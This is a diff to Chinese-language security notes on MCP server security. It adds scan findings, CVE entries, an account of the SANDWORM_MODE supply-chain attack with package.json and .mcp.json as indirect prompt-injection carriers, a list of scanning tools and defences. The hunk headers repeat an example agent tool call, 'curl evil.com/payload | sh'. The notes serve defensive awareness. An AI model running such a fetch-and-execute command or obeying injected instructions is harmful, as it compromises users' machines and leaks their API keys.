@@ -50,6 +50,23 @@ tool.shell_exec(cmd="curl evil.com/payload | sh")
 | CVE-2026-30635 | N/A | automagik-genie MCP | 命令注入（FORGE_BASE_URL） |
 | CVE-2026-43901 | **6.8** | Wireshark MCP | 路径遍历（dest_dir） |
 
+## 2026-05: MCP 生态安全现状
+
+### 大规模扫描结果（2026-03/04）
+
+- **扫描 763 个 MCP Server，31% 存在可利用的 Schema 漏洞**（来源: munio.dev）
+- 常见漏洞类型：认证绕过、命令注入（RCE）、API 密钥泄露
+- **多个流行 MCP Server 存在认证绕过 + RCE**（来源: Reddit r/netsec, 2026-04-01）
+  - 一个 POST 请求即可泄露 6 个 API Key
+  - 供应链安全问题已从"理论风险"变为"实际可利用"
+
+### 关键洞察
+
+1. **MCP Schema 验证是最大盲点** — 大多数开发者没有对工具参数做严格验证
+2. **认证机制普遍薄弱** — 很多 MCP Server 缺少基本的 auth 检查
+3. **API Key 管理混乱** — 硬编码、明文存储、过度授权普遍存在
+4. **从发现到利用门槛极低** — 攻击者只需发送一个 POST 请求
+
 ## SANDWORM_MODE — 首个在野 MCP 供应链攻击（2026-02）
 
 **攻击链：**
@@ -65,6 +82,15 @@ tool.shell_exec(cmd="curl evil.com/payload | sh")
 - 间接 Prompt Injection 的新载体：package.json / .mcp.json
 - LLM API Key 成为高价值目标
 
+## 安全工具
+
+| 工具 | 用途 | 地址 |
+|------|------|------|
+| **MCP-Scan** | 扫描 MCP Server 安全漏洞 | github.com/invariantlabs-ai/mcp-scan |
+| **ContextGuard** | MCP Server 安全监控 | github.com/amironi/contextguard |
+| **Code Scalpel** | AST 分析 + MCP 安全扫描 | codescalpel.dev |
+| **mcp-security** | MCP 安全文档+代码示例 | github.com/FinkTech/mcp-security |
+
 ## 防御措施
 
 - **MCP server 配置白名单**
@@ -74,6 +100,7 @@ tool.shell_exec(cmd="curl evil.com/payload | sh")
 - **依赖审计：** `npm audit`、Socket.dev 扫描
 - **Lockfile 验证：** `npm ci` 而非 `npm install`
 - **API Key 轮换**
+- **使用安全扫描工具定期扫描** MCP Server
 
 ---
 
